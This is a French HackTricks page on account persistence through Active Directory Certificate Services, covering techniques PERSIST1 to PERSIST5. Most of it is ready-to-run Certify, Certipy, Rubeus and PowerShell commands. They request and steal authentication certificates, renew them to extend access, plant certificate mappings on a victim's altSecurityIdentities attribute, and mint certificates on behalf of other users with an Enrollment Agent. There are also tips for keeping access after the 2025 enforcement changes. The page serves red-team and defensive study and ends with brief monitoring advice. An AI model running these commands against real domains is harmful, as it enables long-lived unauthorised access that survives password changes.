# Persistance des comptes AD CS

{{#include ../../../banners/hacktricks-training.md}}

**Ceci est un petit résumé des chapitres sur la persistance des comptes de l'excellent travail de recherche de [https://specterops.io/assets/resources/Certified_Pre-Owned.pdf](https://specterops.io/assets/resources/Certified_Pre-Owned.pdf)**

## Comprendre le vol actif d'identifiants utilisateur avec des certificats – PERSIST1

Dans un scénario où un certificat permettant l'authentification au domaine peut être demandé par un utilisateur, un attaquant a la possibilité de demander et de voler ce certificat pour maintenir une persistance sur un réseau. Par défaut, le modèle `User` dans Active Directory permet de telles demandes, bien qu'il puisse parfois être désactivé.

En utilisant [Certify](https://github.com/GhostPack/Certify) ou [Certipy](https://github.com/ly4k/Certipy), vous pouvez rechercher des modèles activés qui permettent l'authentification client puis en demander un:
```bash
# Enumerate client-auth capable templates
Certify.exe find /clientauth

# Request a user cert from an Enterprise CA (current user context)
Certify.exe request /ca:CA-SERVER\CA-NAME /template:User

# Using Certipy (RPC/DCOM/WebEnrollment supported). Saves a PFX by default
certipy req -u 'john@corp.local' -p 'Passw0rd!' -ca 'CA-SERVER\CA-NAME' -template 'User' -out user.pfx
```
La puissance d'un certificat réside dans sa capacité à s'authentifier en tant qu'utilisateur auquel il appartient, indépendamment des changements de mot de passe, tant que le certificat reste valide.

Vous pouvez convertir PEM en PFX et l'utiliser pour obtenir un TGT:
```bash
# Convert PEM returned by Certify to PFX
openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx

# Use certificate for PKINIT and inject the TGT
Rubeus.exe asktgt /user:john /certificate:C:\Temp\cert.pfx /password:CertPass! /ptt

# Or with Certipy
certipy auth -pfx user.pfx -dc-ip 10.0.0.10
```
> Remarque : combinée à d'autres techniques (voir les sections THEFT), certificate-based auth permet un accès persistant sans toucher LSASS et même depuis des contextes non privilégiés.

## Obtention d'une persistance sur la machine avec des certificats - PERSIST2

Si un attaquant dispose de privilèges élevés sur un hôte, il peut obtenir un certificat pour le compte machine du système compromis en utilisant le modèle `Machine` par défaut. S'authentifier en tant que machine permet d'activer S4U2Self pour les services locaux et peut fournir une persistance durable sur l'hôte :
```bash
# Request a machine certificate as SYSTEM
Certify.exe request /ca:dc.theshire.local/theshire-DC-CA /template:Machine /machine

# Authenticate as the machine using the issued PFX
Rubeus.exe asktgt /user:HOSTNAME$ /certificate:C:\Temp\host.pfx /password:Passw0rd! /ptt
```
## Étendre la persistance par le renouvellement de certificats - PERSIST3

Abuser des périodes de validité et de renouvellement des modèles de certificat permet à un attaquant de conserver un accès à long terme. Si vous possédez un certificat déjà émis et sa clé privée, vous pouvez le renouveler avant son expiration pour obtenir un nouvel identifiant de longue durée sans laisser d'artefacts de requête supplémentaires liés au principal d'origine.
```bash
# Renewal with Certipy (works with RPC/DCOM/WebEnrollment)
# Provide the existing PFX and target the same CA/template when possible
certipy req -u 'john@corp.local' -p 'Passw0rd!' -ca 'CA-SERVER\CA-NAME' \
-template 'User' -pfx user_old.pfx -renew -out user_renewed.pfx

# Native Windows renewal with certreq
# (use the serial/thumbprint of the cert to renew; reusekeys preserves the keypair)
certreq -enroll -user -cert <SerialOrID> renew [reusekeys]
```
> Astuce opérationnelle : Suivez la durée de vie des fichiers PFX détenus par l'attaquant et renouvelez-les tôt. Le renouvellement peut aussi faire en sorte que les certificats mis à jour incluent l'extension moderne de mappage SID, les gardant utilisables sous des règles de mappage du DC plus strictes (voir section suivante).

## Planter des correspondances de certificats explicites (altSecurityIdentities) – PERSIST4

Si vous pouvez écrire dans l'attribut `altSecurityIdentities` d'un compte cible, vous pouvez mapper explicitement un certificat contrôlé par l'attaquant à ce compte. Cela persiste malgré les changements de mot de passe et, en utilisant des formats de mappage robustes, reste fonctionnel sous l'application moderne du DC.

Flux général :

1. Obtenir ou émettre un certificat client-auth que vous contrôlez (p. ex., s'enregistrer pour le template `User` en votre nom).
2. Extraire un identifiant fort du certificat (Issuer+Serial, SKI, ou SHA1-PublicKey).
3. Ajouter un mappage explicite dans l'attribut `altSecurityIdentities` du principal victime en utilisant cet identifiant.
4. S'authentifier avec votre certificat ; le DC l'associe au compte victime via le mappage explicite.

Exemple (PowerShell) utilisant un mappage fort Issuer+Serial :
```powershell
# Example values - reverse the issuer DN and serial as required by AD mapping format
$Issuer  = 'DC=corp,DC=local,CN=CORP-DC-CA'
$SerialR = '1200000000AC11000000002B' # reversed byte order of the serial
$Map     = "X509:<I>$Issuer<SR>$SerialR"

# Add mapping to victim. Requires rights to write altSecurityIdentities on the object
Set-ADUser -Identity 'victim' -Add @{altSecurityIdentities=$Map}
```
Authentifiez-vous ensuite avec votre PFX. Certipy obtiendra directement un TGT :
```bash
certipy auth -pfx attacker_user.pfx -dc-ip 10.0.0.10

# If PKINIT is unavailable on the DC, reuse the same persisted cert via Schannel/LDAPS
certipy auth -pfx attacker_user.pfx -dc-ip 10.0.0.10 -ldap-shell
```
### Construire des mappings `altSecurityIdentities` solides

En pratique, les correspondances **Issuer+Serial** et **SKI** sont les formats forts les plus faciles à construire à partir d'un certificat détenu par l'attaquant. Cela devient important après le **11 février 2025**, lorsque les DCs passent par défaut en **Full Enforcement** et que les mappings faibles cessent d'être fiables.
```bash
# Extract issuer, serial and SKI from a cert/PFX
openssl pkcs12 -in attacker_user.pfx -clcerts -nokeys -out attacker_user.crt
openssl x509 -in attacker_user.crt -noout -issuer -serial -ext subjectKeyIdentifier
```

```powershell
# Example strong SKI mapping for a user or computer object
$Map = 'X509:<SKI>9C4D7E8A1B2C3D4E5F60718293A4B5C6D7E8F901'
Set-ADUser -Identity 'victim' -Add @{altSecurityIdentities=$Map}
# Set-ADComputer -Identity 'WS01$' -Add @{altSecurityIdentities=$Map}
```
Remarques
- N'utilisez que des types de mappage forts : `X509IssuerSerialNumber`, `X509SKI`, ou `X509SHA1PublicKey`. Les formats faibles (Subject/Issuer, Subject-only, RFC822 email) sont obsolètes et peuvent être bloqués par la politique du DC.
- Le mappage fonctionne sur les objets **user** et **computer**, donc un accès en écriture à `altSecurityIdentities` d'un compte machine suffit pour persister en tant que cette machine.
- La chaîne de certificats doit se construire jusqu'à une racine approuvée par le DC. Les Enterprise CAs dans NTAuth sont généralement approuvées ; certains environnements font aussi confiance aux CA publiques.
- L'authentification Schannel reste utile pour la persistance même lorsque PKINIT échoue parce que le DC n'a pas le Smart Card Logon EKU ou renvoie `KDC_ERR_PADATA_TYPE_NOSUPP`.

Pour en savoir plus sur les mappages explicites faibles et les chemins d'attaque, voir :


{{#ref}}
domain-escalation.md
{{#endref}}

## Enrollment Agent comme persistance – PERSIST5

Si vous obtenez un certificat Certificate Request Agent/Enrollment Agent valide, vous pouvez créer à volonté de nouveaux certificats capables de logon au nom d'utilisateurs et conserver le PFX de l'agent hors ligne comme jeton de persistance. Flux d'abus :
```bash
# Request an Enrollment Agent cert (requires template rights)
Certify.exe request /ca:CA-SERVER\CA-NAME /template:"Certificate Request Agent"

# Mint a user cert on behalf of another principal using the agent PFX
Certify.exe request /ca:CA-SERVER\CA-NAME /template:User \
/onbehalfof:CORP\\victim /enrollcert:C:\Temp\agent.pfx /enrollcertpw:AgentPfxPass

# Or with Certipy
certipy req -u 'john@corp.local' -p 'Passw0rd!' -ca 'CA-SERVER\CA-NAME' \
-template 'User' -on-behalf-of 'CORP/victim' -pfx agent.pfx -out victim_onbo.pfx
```
La révocation du certificat d'agent ou des permissions du modèle est requise pour évincer cette persistance.

Notes opérationnelles
- Les versions récentes de `Certipy` prennent en charge à la fois `-on-behalf-of` et `-renew`, donc un attaquant possédant un PFX d'Enrollment Agent peut créer puis renouveler des certificats leaf ultérieurement sans repasser par le compte cible initial.
- Si la récupération de TGT basée sur PKINIT n'est pas possible, le certificat on-behalf-of résultant est toujours utilisable pour l'authentification Schannel avec `certipy auth -pfx victim_onbo.pfx -dc-ip 10.0.0.10 -ldap-shell`.

## 2025 Strong Certificate Mapping Enforcement: Impact on Persistence

Microsoft KB5014754 a introduit Strong Certificate Mapping Enforcement sur les contrôleurs de domaine. Depuis le 11 février 2025, les contrôleurs de domaine sont, par défaut, en Full Enforcement, rejetant les mappings faibles ou ambigus. Implications pratiques :

- Les certificats antérieurs à 2022 qui n'incluent pas l'extension de mapping SID peuvent échouer lors du mapping implicite lorsque les DCs sont en Full Enforcement. Les attaquants peuvent maintenir l'accès soit en renouvelant les certificats via AD CS (pour obtenir l'extension SID), soit en implantant un mapping explicite fort dans `altSecurityIdentities` (PERSIST4).
- Les mappings explicites utilisant des formats forts (Issuer+Serial, SKI, SHA1-PublicKey) continuent de fonctionner. Les formats faibles (Issuer/Subject, Subject-only, RFC822) peuvent être bloqués et doivent être évités pour la persistance.

Les administrateurs devraient surveiller et alerter sur :
- Les modifications de `altSecurityIdentities` et les émissions/renouvellements de certificats Enrollment Agent et User.
- Les journaux d'émission de la CA pour les requêtes on-behalf-of et les schémas de renouvellement inhabituels.

## Références

- Microsoft. KB5014754 : modifications de l'authentification basée sur des certificats sur les contrôleurs de domaine Windows (calendrier d'application et mappings forts).
https://support.microsoft.com/en-au/topic/kb5014754-certificate-based-authentication-changes-on-windows-domain-controllers-ad2c23b0-15d8-4340-a468-4d4f3b188f16
- SpecterOps. ADCS ESC14 Abuse Technique (explicit `altSecurityIdentities` abuse on user/computer objects).
https://specterops.io/blog/2024/02/28/adcs-esc14-abuse-technique/
- Certipy Wiki – Référence des commandes (`req -renew`, `auth`, `shadow`).
https://github.com/ly4k/Certipy/wiki/08-%E2%80%90-Command-Reference
- Almond Offensive Security. Authentification avec des certificats lorsque PKINIT n'est pas pris en charge.
https://offsec.almond.consulting/authenticating-with-certificates-when-pkinit-is-not-supported.html

{{#include ../../../banners/hacktricks-training.md}}
